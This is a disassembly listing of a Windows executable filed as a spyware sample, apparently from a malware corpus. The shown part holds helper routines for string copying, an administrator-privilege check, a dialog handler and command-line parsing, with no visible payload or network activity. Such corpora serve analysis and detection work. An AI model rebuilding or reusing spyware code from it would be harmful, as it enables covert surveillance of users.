
malware_samples/spyware/dbdab701feecc382b037b61b4268f1f796c28f3c30d77e18506cb1646bf9cb0b.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	cc                   	int3
   140001001:	cc                   	int3
   140001002:	cc                   	int3
   140001003:	cc                   	int3
   140001004:	cc                   	int3
   140001005:	cc                   	int3
   140001006:	cc                   	int3
   140001007:	cc                   	int3
   140001008:	48 8d 42 ff          	lea    -0x1(%rdx),%rax
   14000100c:	4d 8b d0             	mov    %r8,%r10
   14000100f:	4c 8b ca             	mov    %rdx,%r9
   140001012:	4c 8b d9             	mov    %rcx,%r11
   140001015:	48 3d fe ff ff 7f    	cmp    $0x7ffffffe,%rax
   14000101b:	0f 87 8d 00 00 00    	ja     0x1400010ae
   140001021:	48 8b c1             	mov    %rcx,%rax
   140001024:	80 38 00             	cmpb   $0x0,(%rax)
   140001027:	74 09                	je     0x140001032
   140001029:	48 ff c0             	inc    %rax
   14000102c:	48 83 ea 01          	sub    $0x1,%rdx
   140001030:	75 f2                	jne    0x140001024
   140001032:	49 8b c9             	mov    %r9,%rcx
   140001035:	48 8b c2             	mov    %rdx,%rax
   140001038:	48 2b ca             	sub    %rdx,%rcx
   14000103b:	48 f7 d8             	neg    %rax
   14000103e:	48 8b c2             	mov    %rdx,%rax
   140001041:	4d 1b c0             	sbb    %r8,%r8
   140001044:	4c 23 c1             	and    %rcx,%r8
   140001047:	48 f7 d8             	neg    %rax
   14000104a:	1b c0                	sbb    %eax,%eax
   14000104c:	f7 d0                	not    %eax
   14000104e:	25 57 00 07 80       	and    $0x80070057,%eax
   140001053:	48 85 d2             	test   %rdx,%rdx
   140001056:	74 5b                	je     0x1400010b3
   140001058:	49 8b c9             	mov    %r9,%rcx
   14000105b:	4b 8d 14 18          	lea    (%r8,%r11,1),%rdx
   14000105f:	49 2b c8             	sub    %r8,%rcx
   140001062:	74 2e                	je     0x140001092
   140001064:	49 81 c0 fe ff ff 7f 	add    $0x7ffffffe,%r8
   14000106b:	48 8b c1             	mov    %rcx,%rax
   14000106e:	49 2b c1             	sub    %r9,%rax
   140001071:	4c 03 c0             	add    %rax,%r8
   140001074:	4c 2b d2             	sub    %rdx,%r10
   140001077:	4d 85 c0             	test   %r8,%r8
   14000107a:	74 16                	je     0x140001092
   14000107c:	41 8a 04 12          	mov    (%r10,%rdx,1),%al
   140001080:	84 c0                	test   %al,%al
   140001082:	74 0e                	je     0x140001092
   140001084:	88 02                	mov    %al,(%rdx)
   140001086:	49 ff c8             	dec    %r8
   140001089:	48 ff c2             	inc    %rdx
   14000108c:	48 83 e9 01          	sub    $0x1,%rcx
   140001090:	75 e5                	jne    0x140001077
   140001092:	48 85 c9             	test   %rcx,%rcx
   140001095:	48 8d 42 ff          	lea    -0x1(%rdx),%rax
   140001099:	48 0f 45 c2          	cmovne %rdx,%rax
   14000109d:	48 f7 d9             	neg    %rcx
   1400010a0:	c6 00 00             	movb   $0x0,(%rax)
   1400010a3:	1b c0                	sbb    %eax,%eax
   1400010a5:	f7 d0                	not    %eax
   1400010a7:	25 7a 00 07 80       	and    $0x8007007a,%eax
   1400010ac:	c3                   	ret
   1400010ad:	cc                   	int3
   1400010ae:	b8 57 00 07 80       	mov    $0x80070057,%eax
   1400010b3:	c3                   	ret
   1400010b4:	cc                   	int3
   1400010b5:	cc                   	int3
   1400010b6:	cc                   	int3
   1400010b7:	cc                   	int3
   1400010b8:	cc                   	int3
   1400010b9:	cc                   	int3
   1400010ba:	cc                   	int3
   1400010bb:	cc                   	int3
   1400010bc:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   1400010c1:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1400010c6:	53                   	push   %rbx
   1400010c7:	56                   	push   %rsi
   1400010c8:	57                   	push   %rdi
   1400010c9:	48 83 ec 20          	sub    $0x20,%rsp
   1400010cd:	48 8d 42 ff          	lea    -0x1(%rdx),%rax
   1400010d1:	48 8b f1             	mov    %rcx,%rsi
   1400010d4:	48 3d fe ff ff 7f    	cmp    $0x7ffffffe,%rax
   1400010da:	76 0f                	jbe    0x1400010eb
   1400010dc:	bb 57 00 07 80       	mov    $0x80070057,%ebx
   1400010e1:	48 85 d2             	test   %rdx,%rdx
   1400010e4:	74 39                	je     0x14000111f
   1400010e6:	c6 01 00             	movb   $0x0,(%rcx)
   1400010e9:	eb 34                	jmp    0x14000111f
   1400010eb:	48 8d 7a ff          	lea    -0x1(%rdx),%rdi
   1400010ef:	33 db                	xor    %ebx,%ebx
   1400010f1:	48 8b d7             	mov    %rdi,%rdx
   1400010f4:	4c 8d 4c 24 58       	lea    0x58(%rsp),%r9
   1400010f9:	48 ff 15 48 85 00 00 	rex.W call *0x8548(%rip)        # 0x140009648
   140001100:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001105:	85 c0                	test   %eax,%eax
   140001107:	78 0e                	js     0x140001117
   140001109:	48 98                	cltq
   14000110b:	48 3b c7             	cmp    %rdi,%rax
   14000110e:	77 07                	ja     0x140001117
   140001110:	75 0d                	jne    0x14000111f
   140001112:	88 1c 37             	mov    %bl,(%rdi,%rsi,1)
   140001115:	eb 08                	jmp    0x14000111f
   140001117:	88 1c 37             	mov    %bl,(%rdi,%rsi,1)
   14000111a:	bb 7a 00 07 80       	mov    $0x8007007a,%ebx
   14000111f:	8b c3                	mov    %ebx,%eax
   140001121:	48 83 c4 20          	add    $0x20,%rsp
   140001125:	5f                   	pop    %rdi
   140001126:	5e                   	pop    %rsi
   140001127:	5b                   	pop    %rbx
   140001128:	c3                   	ret
   140001129:	cc                   	int3
   14000112a:	cc                   	int3
   14000112b:	cc                   	int3
   14000112c:	cc                   	int3
   14000112d:	cc                   	int3
   14000112e:	cc                   	int3
   14000112f:	cc                   	int3
   140001130:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140001135:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   14000113a:	56                   	push   %rsi
   14000113b:	57                   	push   %rdi
   14000113c:	41 56                	push   %r14
   14000113e:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   140001145:	48 8b 05 bc ae 00 00 	mov    0xaebc(%rip),%rax        # 0x14000c008
   14000114c:	48 33 c4             	xor    %rsp,%rax
   14000114f:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   140001154:	4c 8b f1             	mov    %rcx,%r14
   140001157:	66 c7 44 24 6c 00 05 	movw   $0x500,0x6c(%rsp)
   14000115e:	33 ed                	xor    %ebp,%ebp
   140001160:	48 8d 0d 01 86 00 00 	lea    0x8601(%rip),%rcx        # 0x140009768
   140001167:	8b fd                	mov    %ebp,%edi
   140001169:	89 6c 24 68          	mov    %ebp,0x68(%rsp)
   14000116d:	48 ff 15 c4 80 00 00 	rex.W call *0x80c4(%rip)        # 0x140009238
   140001174:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001179:	48 8b d8             	mov    %rax,%rbx
   14000117c:	48 85 c0             	test   %rax,%rax
   14000117f:	0f 84 a4 00 00 00    	je     0x140001229
   140001185:	48 8d 15 ec 85 00 00 	lea    0x85ec(%rip),%rdx        # 0x140009778
   14000118c:	48 8b c8             	mov    %rax,%rcx
   14000118f:	48 ff 15 ea 80 00 00 	rex.W call *0x80ea(%rip)        # 0x140009280
   140001196:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000119b:	48 8b f0             	mov    %rax,%rsi
   14000119e:	48 85 c0             	test   %rax,%rax
   1400011a1:	74 77                	je     0x14000121a
   1400011a3:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   1400011a8:	41 89 2e             	mov    %ebp,(%r14)
   1400011ab:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   1400011b0:	44 8d 45 20          	lea    0x20(%rbp),%r8d
   1400011b4:	89 6c 24 48          	mov    %ebp,0x48(%rsp)
   1400011b8:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   1400011bd:	89 6c 24 40          	mov    %ebp,0x40(%rsp)
   1400011c1:	8d 7d 01             	lea    0x1(%rbp),%edi
   1400011c4:	89 6c 24 38          	mov    %ebp,0x38(%rsp)
   1400011c8:	41 b9 20 02 00 00    	mov    $0x220,%r9d
   1400011ce:	89 6c 24 30          	mov    %ebp,0x30(%rsp)
   1400011d2:	b2 02                	mov    $0x2,%dl
   1400011d4:	89 6c 24 28          	mov    %ebp,0x28(%rsp)
   1400011d8:	89 6c 24 20          	mov    %ebp,0x20(%rsp)
   1400011dc:	48 ff 15 ad 7f 00 00 	rex.W call *0x7fad(%rip)        # 0x140009190
   1400011e3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400011e8:	85 c0                	test   %eax,%eax
   1400011ea:	74 2e                	je     0x14000121a
   1400011ec:	49 ba 70 d8 5e 1c 79 	movabs $0x8e0daf791c5ed870,%r10
   1400011f3:	af 0d 8e 
   1400011f6:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   1400011fb:	4d 8b c6             	mov    %r14,%r8
   1400011fe:	33 c9                	xor    %ecx,%ecx
   140001200:	48 8b c6             	mov    %rsi,%rax
   140001203:	ff 15 77 84 00 00    	call   *0x8477(%rip)        # 0x140009680
   140001209:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   14000120e:	48 ff 15 53 7f 00 00 	rex.W call *0x7f53(%rip)        # 0x140009168
   140001215:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000121a:	48 8b cb             	mov    %rbx,%rcx
   14000121d:	48 ff 15 7c 80 00 00 	rex.W call *0x807c(%rip)        # 0x1400092a0
   140001224:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001229:	8b c7                	mov    %edi,%eax
   14000122b:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   140001230:	48 33 cc             	xor    %rsp,%rcx
   140001233:	e8 b8 74 00 00       	call   0x1400086f0
   140001238:	4c 8d 9c 24 80 00 00 	lea    0x80(%rsp),%r11
   14000123f:	00 
   140001240:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   140001244:	49 8b 6b 30          	mov    0x30(%r11),%rbp
   140001248:	49 8b e3             	mov    %r11,%rsp
   14000124b:	41 5e                	pop    %r14
   14000124d:	5f                   	pop    %rdi
   14000124e:	5e                   	pop    %rsi
   14000124f:	c3                   	ret
   140001250:	cc                   	int3
   140001251:	cc                   	int3
   140001252:	cc                   	int3
   140001253:	cc                   	int3
   140001254:	cc                   	int3
   140001255:	cc                   	int3
   140001256:	cc                   	int3
   140001257:	cc                   	int3
   140001258:	48 8b c4             	mov    %rsp,%rax
   14000125b:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000125f:	48 89 70 10          	mov    %rsi,0x10(%rax)
   140001263:	48 89 78 18          	mov    %rdi,0x18(%rax)
   140001267:	4c 89 70 20          	mov    %r14,0x20(%rax)
   14000126b:	55                   	push   %rbp
   14000126c:	48 8d 68 a1          	lea    -0x5f(%rax),%rbp
   140001270:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   140001277:	48 8b 05 8a ad 00 00 	mov    0xad8a(%rip),%rax        # 0x14000c008
   14000127e:	48 33 c4             	xor    %rsp,%rax
   140001281:	48 89 45 47          	mov    %rax,0x47(%rbp)
   140001285:	8b 05 c1 ae 00 00    	mov    0xaec1(%rip),%eax        # 0x14000c14c
   14000128b:	45 33 f6             	xor    %r14d,%r14d
   14000128e:	44 89 75 3f          	mov    %r14d,0x3f(%rbp)
   140001292:	66 c7 45 43 00 05    	movw   $0x500,0x43(%rbp)
   140001298:	44 89 75 27          	mov    %r14d,0x27(%rbp)
   14000129c:	41 8d 5e 02          	lea    0x2(%r14),%ebx
   1400012a0:	3b c3                	cmp    %ebx,%eax
   1400012a2:	0f 85 92 01 00 00    	jne    0x14000143a
   1400012a8:	48 8d 4d 27          	lea    0x27(%rbp),%rcx
   1400012ac:	e8 7f fe ff ff       	call   0x140001130
   1400012b1:	85 c0                	test   %eax,%eax
   1400012b3:	0f 85 68 01 00 00    	jne    0x140001421
   1400012b9:	48 ff 15 40 81 00 00 	rex.W call *0x8140(%rip)        # 0x140009400
   1400012c0:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400012c5:	48 8b c8             	mov    %rax,%rcx
   1400012c8:	4c 8d 45 2f          	lea    0x2f(%rbp),%r8
   1400012cc:	8d 53 06             	lea    0x6(%rbx),%edx
   1400012cf:	48 ff 15 9a 7e 00 00 	rex.W call *0x7e9a(%rip)        # 0x140009170
   1400012d6:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400012db:	85 c0                	test   %eax,%eax
   1400012dd:	0f 84 57 01 00 00    	je     0x14000143a
   1400012e3:	48 8b 4d 2f          	mov    0x2f(%rbp),%rcx
   1400012e7:	48 8d 45 2b          	lea    0x2b(%rbp),%rax
   1400012eb:	45 33 c9             	xor    %r9d,%r9d
   1400012ee:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400012f3:	45 33 c0             	xor    %r8d,%r8d
   1400012f6:	8b d3                	mov    %ebx,%edx
   1400012f8:	48 ff 15 49 7e 00 00 	rex.W call *0x7e49(%rip)        # 0x140009148
   1400012ff:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001304:	85 c0                	test   %eax,%eax
   140001306:	0f 85 00 01 00 00    	jne    0x14000140c
   14000130c:	48 ff 15 0d 7f 00 00 	rex.W call *0x7f0d(%rip)        # 0x140009220
   140001313:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001318:	83 f8 7a             	cmp    $0x7a,%eax
   14000131b:	0f 85 eb 00 00 00    	jne    0x14000140c
   140001321:	8b 55 2b             	mov    0x2b(%rbp),%edx
   140001324:	33 c9                	xor    %ecx,%ecx
   140001326:	48 ff 15 bb 80 00 00 	rex.W call *0x80bb(%rip)        # 0x1400093e8
   14000132d:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001332:	48 8b f8             	mov    %rax,%rdi
   140001335:	48 85 c0             	test   %rax,%rax
   140001338:	0f 84 ce 00 00 00    	je     0x14000140c
   14000133e:	44 8b 4d 2b          	mov    0x2b(%rbp),%r9d
   140001342:	48 8d 45 2b          	lea    0x2b(%rbp),%rax
   140001346:	48 8b 4d 2f          	mov    0x2f(%rbp),%rcx
   14000134a:	4c 8b c7             	mov    %rdi,%r8
   14000134d:	8b d3                	mov    %ebx,%edx
   14000134f:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001354:	48 ff 15 ed 7d 00 00 	rex.W call *0x7ded(%rip)        # 0x140009148
   14000135b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001360:	85 c0                	test   %eax,%eax
   140001362:	0f 84 95 00 00 00    	je     0x1400013fd
   140001368:	48 8d 45 37          	lea    0x37(%rbp),%rax
   14000136c:	41 b9 20 02 00 00    	mov    $0x220,%r9d
   140001372:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140001377:	48 8d 4d 3f          	lea    0x3f(%rbp),%rcx
   14000137b:	44 89 74 24 48       	mov    %r14d,0x48(%rsp)
   140001380:	41 b8 20 00 00 00    	mov    $0x20,%r8d
   140001386:	44 89 74 24 40       	mov    %r14d,0x40(%rsp)
   14000138b:	8a d3                	mov    %bl,%dl
   14000138d:	44 89 74 24 38       	mov    %r14d,0x38(%rsp)
   140001392:	44 89 74 24 30       	mov    %r14d,0x30(%rsp)
   140001397:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   14000139c:	44 89 74 24 20       	mov    %r14d,0x20(%rsp)
   1400013a1:	48 ff 15 e8 7d 00 00 	rex.W call *0x7de8(%rip)        # 0x140009190
   1400013a8:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400013ad:	85 c0                	test   %eax,%eax
   1400013af:	74 4c                	je     0x1400013fd
   1400013b1:	41 8b f6             	mov    %r14d,%esi
   1400013b4:	44 39 37             	cmp    %r14d,(%rdi)
   1400013b7:	76 34                	jbe    0x1400013ed
   1400013b9:	bb 01 00 00 00       	mov    $0x1,%ebx
   1400013be:	48 8b 55 37          	mov    0x37(%rbp),%rdx
   1400013c2:	8b ce                	mov    %esi,%ecx
   1400013c4:	48 03 c9             	add    %rcx,%rcx
   1400013c7:	48 8b 4c cf 08       	mov    0x8(%rdi,%rcx,8),%rcx
   1400013cc:	48 ff 15 cd 7d 00 00 	rex.W call *0x7dcd(%rip)        # 0x1400091a0
   1400013d3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400013d8:	85 c0                	test   %eax,%eax
   1400013da:	75 08                	jne    0x1400013e4
   1400013dc:	03 f3                	add    %ebx,%esi
   1400013de:	3b 37                	cmp    (%rdi),%esi
   1400013e0:	72 dc                	jb     0x1400013be
   1400013e2:	eb 09                	jmp    0x1400013ed
   1400013e4:	89 1d 62 ad 00 00    	mov    %ebx,0xad62(%rip)        # 0x14000c14c
   1400013ea:	89 5d 27             	mov    %ebx,0x27(%rbp)
   1400013ed:	48 8b 4d 37          	mov    0x37(%rbp),%rcx
   1400013f1:	48 ff 15 70 7d 00 00 	rex.W call *0x7d70(%rip)        # 0x140009168
   1400013f8:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400013fd:	48 8b cf             	mov    %rdi,%rcx
   140001400:	48 ff 15 89 7e 00 00 	rex.W call *0x7e89(%rip)        # 0x140009290
   140001407:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000140c:	48 8b 4d 2f          	mov    0x2f(%rbp),%rcx
   140001410:	48 ff 15 41 7e 00 00 	rex.W call *0x7e41(%rip)        # 0x140009258
   140001417:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000141c:	8b 45 27             	mov    0x27(%rbp),%eax
   14000141f:	eb 19                	jmp    0x14000143a
   140001421:	8b 0d 25 ad 00 00    	mov    0xad25(%rip),%ecx        # 0x14000c14c
   140001427:	bb 01 00 00 00       	mov    $0x1,%ebx
   14000142c:	8b 45 27             	mov    0x27(%rbp),%eax
   14000142f:	85 c0                	test   %eax,%eax
   140001431:	0f 45 cb             	cmovne %ebx,%ecx
   140001434:	89 0d 12 ad 00 00    	mov    %ecx,0xad12(%rip)        # 0x14000c14c
   14000143a:	48 8b 4d 47          	mov    0x47(%rbp),%rcx
   14000143e:	48 33 cc             	xor    %rsp,%rcx
   140001441:	e8 aa 72 00 00       	call   0x1400086f0
   140001446:	4c 8d 9c 24 90 00 00 	lea    0x90(%rsp),%r11
   14000144d:	00 
   14000144e:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   140001452:	49 8b 73 18          	mov    0x18(%r11),%rsi
   140001456:	49 8b 7b 20          	mov    0x20(%r11),%rdi
   14000145a:	4d 8b 73 28          	mov    0x28(%r11),%r14
   14000145e:	49 8b e3             	mov    %r11,%rsp
   140001461:	5d                   	pop    %rbp
   140001462:	c3                   	ret
   140001463:	cc                   	int3
   140001464:	cc                   	int3
   140001465:	cc                   	int3
   140001466:	cc                   	int3
   140001467:	cc                   	int3
   140001468:	71 ea                	jno    0x140001454
   14000146a:	d6                   	udb
   14000146b:	10 17                	adc    %dl,(%rdi)
   14000146d:	06                   	(bad)
   14000146e:	18 cf                	sbb    %cl,%bh
   140001470:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140001475:	57                   	push   %rdi
   140001476:	48 81 ec 30 02 00 00 	sub    $0x230,%rsp
   14000147d:	48 8b 05 84 ab 00 00 	mov    0xab84(%rip),%rax        # 0x14000c008
   140001484:	48 33 c4             	xor    %rsp,%rax
   140001487:	48 89 84 24 20 02 00 	mov    %rax,0x220(%rsp)
   14000148e:	00 
   14000148f:	49 8b f9             	mov    %r9,%rdi
   140001492:	49 8b c0             	mov    %r8,%rax
   140001495:	48 8b d9             	mov    %rcx,%rbx
   140001498:	81 ea 10 01 00 00    	sub    $0x110,%edx
   14000149e:	74 27                	je     0x1400014c7
   1400014a0:	83 fa 01             	cmp    $0x1,%edx
   1400014a3:	75 1e                	jne    0x1400014c3
   1400014a5:	49 81 c0 c3 f7 ff ff 	add    $0xfffffffffffff7c3,%r8
   1400014ac:	49 83 f8 01          	cmp    $0x1,%r8
   1400014b0:	77 11                	ja     0x1400014c3
   1400014b2:	48 8b d0             	mov    %rax,%rdx
   1400014b5:	48 ff 15 a4 80 00 00 	rex.W call *0x80a4(%rip)        # 0x140009560
   1400014bc:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400014c1:	eb 68                	jmp    0x14000152b
   1400014c3:	33 c0                	xor    %eax,%eax
   1400014c5:	eb 69                	jmp    0x140001530
   1400014c7:	48 ff 15 ba 80 00 00 	rex.W call *0x80ba(%rip)        # 0x140009588
   1400014ce:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400014d3:	48 8b d0             	mov    %rax,%rdx
   1400014d6:	48 8b cb             	mov    %rbx,%rcx
   1400014d9:	e8 ea 38 00 00       	call   0x140004dc8
   1400014de:	48 8b 0d 8b c9 00 00 	mov    0xc98b(%rip),%rcx        # 0x14000de70
   1400014e5:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   1400014ea:	41 b9 00 02 00 00    	mov    $0x200,%r9d
   1400014f0:	c6 44 24 20 00       	movb   $0x0,0x20(%rsp)
   1400014f5:	8b d7                	mov    %edi,%edx
   1400014f7:	48 ff 15 52 80 00 00 	rex.W call *0x8052(%rip)        # 0x140009550
   1400014fe:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001503:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   140001508:	ba 3f 08 00 00       	mov    $0x83f,%edx
   14000150d:	48 8b cb             	mov    %rbx,%rcx
   140001510:	48 ff 15 61 80 00 00 	rex.W call *0x8061(%rip)        # 0x140009578
   140001517:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000151c:	83 c9 ff             	or     $0xffffffff,%ecx
   14000151f:	48 ff 15 42 80 00 00 	rex.W call *0x8042(%rip)        # 0x140009568
   140001526:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000152b:	b8 01 00 00 00       	mov    $0x1,%eax
   140001530:	48 8b 8c 24 20 02 00 	mov    0x220(%rsp),%rcx
   140001537:	00 
   140001538:	48 33 cc             	xor    %rsp,%rcx
   14000153b:	e8 b0 71 00 00       	call   0x1400086f0
   140001540:	48 8b 9c 24 48 02 00 	mov    0x248(%rsp),%rbx
   140001547:	00 
   140001548:	48 81 c4 30 02 00 00 	add    $0x230,%rsp
   14000154f:	5f                   	pop    %rdi
   140001550:	c3                   	ret
   140001551:	cc                   	int3
   140001552:	cc                   	int3
   140001553:	cc                   	int3
   140001554:	cc                   	int3
   140001555:	cc                   	int3
   140001556:	cc                   	int3
   140001557:	cc                   	int3
   140001558:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000155d:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140001562:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140001567:	57                   	push   %rdi
   140001568:	48 83 ec 20          	sub    $0x20,%rsp
   14000156c:	48 8b 19             	mov    (%rcx),%rbx
   14000156f:	48 8b f2             	mov    %rdx,%rsi
   140001572:	48 8b f9             	mov    %rcx,%rdi
   140001575:	33 ed                	xor    %ebp,%ebp
   140001577:	eb 08                	jmp    0x140001581
   140001579:	40 38 2b             	cmp    %bpl,(%rbx)
   14000157c:	74 6a                	je     0x1400015e8
   14000157e:	48 ff c3             	inc    %rbx
   140001581:	0f be 13             	movsbl (%rbx),%edx
   140001584:	48 8b ce             	mov    %rsi,%rcx
   140001587:	e8 bc 69 00 00       	call   0x140007f48
   14000158c:	48 85 c0             	test   %rax,%rax
   14000158f:	75 e8                	jne    0x140001579
   140001591:	0f be 13             	movsbl (%rbx),%edx
   140001594:	48 8b ce             	mov    %rsi,%rcx
   140001597:	48 89 1f             	mov    %rbx,(%rdi)
   14000159a:	e8 a9 69 00 00       	call   0x140007f48
   14000159f:	48 85 c0             	test   %rax,%rax
   1400015a2:	75 1d                	jne    0x1400015c1
   1400015a4:	48 8b fb             	mov    %rbx,%rdi
   1400015a7:	80 3f 00             	cmpb   $0x0,(%rdi)
   1400015aa:	74 15                	je     0x1400015c1
   1400015ac:	48 ff c7             	inc    %rdi
   1400015af:	48 8b ce             	mov    %rsi,%rcx
   1400015b2:	ff c5                	inc    %ebp
   1400015b4:	0f be 17             	movsbl (%rdi),%edx
   1400015b7:	e8 8c 69 00 00       	call   0x140007f48
   1400015bc:	48 85 c0             	test   %rax,%rax
   1400015bf:	74 e6                	je     0x1400015a7
   1400015c1:	48 63 c5             	movslq %ebp,%rax
   1400015c4:	48 03 c3             	add    %rbx,%rax
   1400015c7:	80 38 00             	cmpb   $0x0,(%rax)
   1400015ca:	74 06                	je     0x1400015d2
   1400015cc:	c6 00 00             	movb   $0x0,(%rax)
   1400015cf:	48 ff c0             	inc    %rax
   1400015d2:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400015d7:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   1400015dc:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400015e1:	48 83 c4 20          	add    $0x20,%rsp
   1400015e5:	5f                   	pop    %rdi
   1400015e6:	c3                   	ret
   1400015e7:	cc                   	int3
   1400015e8:	33 c0                	xor    %eax,%eax
   1400015ea:	eb e6                	jmp    0x1400015d2
   1400015ec:	cc                   	int3
   1400015ed:	cc                   	int3
   1400015ee:	cc                   	int3
   1400015ef:	cc                   	int3
   1400015f0:	cc                   	int3
   1400015f1:	cc                   	int3
   1400015f2:	cc                   	int3
   1400015f3:	cc                   	int3
   1400015f4:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400015f9:	55                   	push   %rbp
   1400015fa:	56                   	push   %rsi
   1400015fb:	57                   	push   %rdi
   1400015fc:	41 54                	push   %r12
   1400015fe:	41 55                	push   %r13
   140001600:	41 56                	push   %r14
   140001602:	41 57                	push   %r15
   140001604:	48 8d ac 24 90 fa ff 	lea    -0x570(%rsp),%rbp
   14000160b:	ff 
   14000160c:	48 81 ec 70 06 00 00 	sub    $0x670,%rsp
   140001613:	48 8b 05 ee a9 00 00 	mov    0xa9ee(%rip),%rax        # 0x14000c008
   14000161a:	48 33 c4             	xor    %rsp,%rax
   14000161d:	48 89 85 60 05 00 00 	mov    %rax,0x560(%rbp)
   140001624:	48 8b f1             	mov    %rcx,%rsi
   140001627:	4c 89 44 24 38       	mov    %r8,0x38(%rsp)
   14000162c:	4c 8b d6             	mov    %rsi,%r10
   14000162f:	48 8d 45 50          	lea    0x50(%rbp),%rax
   140001633:	4c 2b d0             	sub    %rax,%r10
   140001636:	48 8d 4d 50          	lea    0x50(%rbp),%rcx
   14000163a:	41 bf 04 01 00 00    	mov    $0x104,%r15d
   140001640:	45 33 e4             	xor    %r12d,%r12d
   140001643:	4d 8b e9             	mov    %r9,%r13
   140001646:	41 8b d7             	mov    %r15d,%edx
   140001649:	48 8d 82 fa fe ff 7f 	lea    0x7ffffefa(%rdx),%rax
   140001650:	48 85 c0             	test   %rax,%rax
   140001653:	74 13                	je     0x140001668
   140001655:	41 8a 04 0a          	mov    (%r10,%rcx,1),%al
   140001659:	84 c0                	test   %al,%al
   14000165b:	74 0b                	je     0x140001668
   14000165d:	88 01                	mov    %al,(%rcx)
   14000165f:	48 ff c1             	inc    %rcx
   140001662:	48 83 ea 01          	sub    $0x1,%rdx
   140001666:	75 e1                	jne    0x140001649
   140001668:	48 85 d2             	test   %rdx,%rdx
   14000166b:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   14000166f:	48 0f 45 c1          	cmovne %rcx,%rax
   140001673:	44 88 20             	mov    %r12b,(%rax)
   140001676:	80 7d 50 22          	cmpb   $0x22,0x50(%rbp)
   14000167a:	75 0d                	jne    0x140001689
   14000167c:	48 8d 15 0d 81 00 00 	lea    0x810d(%rip),%rdx        # 0x140009790
   140001683:	48 8d 45 51          	lea    0x51(%rbp),%rax
   140001687:	eb 0b                	jmp    0x140001694
   140001689:	48 8d 15 04 81 00 00 	lea    0x8104(%rip),%rdx        # 0x140009794
   140001690:	48 8d 45 50          	lea    0x50(%rbp),%rax
   140001694:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140001699:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000169e:	e8 b5 fe ff ff       	call   0x140001558
   1400016a3:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   1400016a8:	48 83 cb ff          	or     $0xffffffffffffffff,%rbx
   1400016ac:	4c 8b f0             	mov    %rax,%r14
   1400016af:	48 85 ff             	test   %rdi,%rdi
   1400016b2:	74 6a                	je     0x14000171e
   1400016b4:	48 8b c3             	mov    %rbx,%rax
   1400016b7:	48 ff c0             	inc    %rax
   1400016ba:	44 38 24 07          	cmp    %r12b,(%rdi,%rax,1)
   1400016be:	75 f7                	jne    0x1400016b7
   1400016c0:	48 83 f8 03          	cmp    $0x3,%rax
   1400016c4:	72 58                	jb     0x14000171e
   1400016c6:	8a 47 01             	mov    0x1(%rdi),%al
   1400016c9:	b1 5c                	mov    $0x5c,%cl
   1400016cb:	3c 3a                	cmp    $0x3a,%al
   1400016cd:	75 05                	jne    0x1400016d4
   1400016cf:	38 4f 02             	cmp    %cl,0x2(%rdi)
   1400016d2:	74 08                	je     0x1400016dc
   1400016d4:	38 0f                	cmp    %cl,(%rdi)
   1400016d6:	75 46                	jne    0x14000171e
   1400016d8:	3a c1                	cmp    %cl,%al
   1400016da:	75 42                	jne    0x14000171e
   1400016dc:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
